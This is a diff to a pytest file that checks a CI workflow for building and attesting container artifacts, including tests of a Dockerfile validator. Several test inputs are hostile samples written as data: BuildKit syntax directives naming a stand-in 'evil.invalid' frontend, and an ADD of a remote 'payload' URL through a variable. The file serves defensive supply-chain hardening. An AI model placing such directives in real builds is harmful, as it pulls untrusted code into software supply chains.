@@ -92,6 +92,9 @@ def test_build_request_is_bounded_and_validated_before_any_publication() -> None
     ):
         assert f".request.{field}" in authorization
     assert "GITHUB_REPOSITORY_OWNER" in authorization
+    assert "GITHUB_REPOSITORY" in authorization
+    assert "expected_output_repository" in authorization
+    assert '${repository_name,,}-workloads' in authorization
     assert "output repository must be owned by this GitHub organization" in authorization
     assert "needs: [authorize-request, read-only-ci-gate]" in publisher
 
@@ -149,14 +152,10 @@ def test_build_publishes_digest_only_with_sbom_and_provenance() -> None:
 
     assert "docker/build-push-action@" in build
     assert "path: workload-source" in publisher
-    assert (
-        "context: workload-source/${{ needs.authorize-request.outputs.context }}"
-        in build
-    )
-    assert (
-        "file: workload-source/${{ needs.authorize-request.outputs.dockerfile }}"
-        in build
-    )
+    assert "context: ${{ steps.source.outputs.verified_context }}" in build
+    assert "file: ${{ steps.source.outputs.verified_dockerfile }}" in build
+    assert "context: workload-source/" not in build
+    assert "file: workload-source/" not in build
     assert "target: ${{ needs.authorize-request.outputs.target }}" in build
     assert "platforms: ${{ needs.authorize-request.outputs.architecture }}" in build
     assert "push-by-digest=true" in build
@@ -179,6 +178,11 @@ def test_exact_context_and_declared_base_images_are_verified_before_build() -> N
     build = workflow_step("publish-workload-artifact", "Build digest-only OCI artifact")
 
     assert "git -C workload-source archive" in source
+    assert "id: source" in source
+    assert "tar -xf" in source
+    assert "verified_context=" in source
+    assert "verified_dockerfile=" in source
+    assert 'chmod -R a-w "$verified_root"' in source
     assert "EXPECTED_CONTEXT_DIGEST" in source
     assert "needs.authorize-request.outputs.context_digest" in source
     assert "DECLARED_BASE_IMAGES" in source
@@ -204,6 +208,29 @@ def test_exact_context_and_declared_base_images_are_verified_before_build() -> N
     assert "build-args:" not in build
 
 
+def _run_dockerfile_validator(
+    tmp_path: Path, dockerfile_text: str
+) -> subprocess.CompletedProcess[str]:
+    source = workflow_step("publish-workload-artifact", "Verify exact source context")
+    marker = '          python - "$dockerfile_path" <<\'PY\'\n'
+    script = source.split(marker, maxsplit=1)[1].split("\n          PY", maxsplit=1)[0]
+    script = textwrap.dedent(script)
+    base = f"nvcr.io/nvidia/cuda@sha256:{'a' * 64}"
+    dockerfile = tmp_path / "Dockerfile"
+    dockerfile.write_text(dockerfile_text.replace("{base}", base))
+    env = os.environ.copy()
+    env["DECLARED_BASE_IMAGES"] = json.dumps([base])
+
+    return subprocess.run(
+        [sys.executable, "-", str(dockerfile)],
+        input=script,
+        env=env,
+        check=False,
+        capture_output=True,
+        text=True,
+    )
+
+
 @pytest.mark.parametrize(
     "run_instruction",
     (
@@ -214,27 +241,47 @@ def test_exact_context_and_declared_base_images_are_verified_before_build() -> N
 def test_dockerfile_validator_rejects_run_network_override(
     tmp_path: Path, run_instruction: str
 ) -> None:
-    source = workflow_step("publish-workload-artifact", "Verify exact source context")
-    marker = '          python - "$dockerfile_path" <<\'PY\'\n'
-    script = source.split(marker, maxsplit=1)[1].split("\n          PY", maxsplit=1)[0]
-    script = textwrap.dedent(script)
-    base = f"nvcr.io/nvidia/cuda@sha256:{'a' * 64}"
-    dockerfile = tmp_path / "Dockerfile"
-    dockerfile.write_text(f"FROM {base} AS runtime\n{run_instruction}\n")
-    env = os.environ.copy()
-    env["DECLARED_BASE_IMAGES"] = json.dumps([base])
-
-    result = subprocess.run(
-        [sys.executable, "-", str(dockerfile)],
-        input=script,
-        env=env,
-        check=False,
-        capture_output=True,
-        text=True,
+    result = _run_dockerfile_validator(
+        tmp_path,
+        f"FROM {{base}} AS runtime\n{run_instruction}\n",
     )
 
     assert result.returncode != 0
     assert "RUN network overrides are forbidden" in result.stderr
+
+
+@pytest.mark.parametrize(
+    "directive",
+    (
+        "\ufeff# syntax=evil.invalid/frontend:latest",
+        "// syntax=evil.invalid/frontend:latest",
+        '{"syntax":"evil.invalid/frontend:latest"}',
+    ),
+)
+def test_dockerfile_validator_rejects_all_buildkit_frontend_forms(
+    tmp_path: Path, directive: str
+) -> None:
+    result = _run_dockerfile_validator(
+        tmp_path,
+        f"{directive}\nFROM {{base}} AS runtime\n",
+    )
+
+    assert result.returncode != 0
+    assert "Dockerfile frontend directives are forbidden" in result.stderr
+
+
+def test_dockerfile_validator_rejects_variable_expanded_remote_add(
+    tmp_path: Path,
+) -> None:
+    result = _run_dockerfile_validator(
+        tmp_path,
+        "FROM {base} AS runtime\n"
+        "ENV PAYLOAD=https://example.invalid/payload\n"
+        "ADD $PAYLOAD /payload\n",
+    )
+
+    assert result.returncode != 0
+    assert "variable ADD inputs are forbidden" in result.stderr
 
 
 def test_result_rejects_manifest_or_attestation_evidence_mismatch() -> None:
@@ -304,6 +351,24 @@ def test_sigstore_attests_provenance_and_sbom_without_tuf_credentials() -> None:
     assert "subject-name: ${{ needs.authorize-request.outputs.output_repository }}" in provenance
     assert "subject-digest: ${{ steps.build.outputs.digest }}" in provenance
     assert "push-to-registry: true" in provenance
+    assert (
+        "predicate-type: https://dgx-forge.dev/attestations/"
+        "workload-artifact-build/v1"
+    ) in provenance
+    assert "predicate-path: workload-artifact-output/provenance-predicate.json" in provenance
+    evidence = workflow_step(
+        "publish-workload-artifact", "Collect workload artifact evidence"
+    )
+    for binding in (
+        "BUILD_REQUEST_DIGEST",
+        "SOURCE_COMMIT",
+        "CONTEXT_DIGEST",
+        "TARGET",
+        "ARCHITECTURE",
+        "BASE_IMAGES",
+    ):
+        assert binding in evidence
+    assert "provenance-predicate.json" in evidence
     assert "sbom-path: workload-artifact-output/sbom.json" in sbom
     assert "subject-name: ${{ needs.authorize-request.outputs.output_repository }}" in sbom
     assert "subject-digest: ${{ steps.build.outputs.digest }}" in sbom
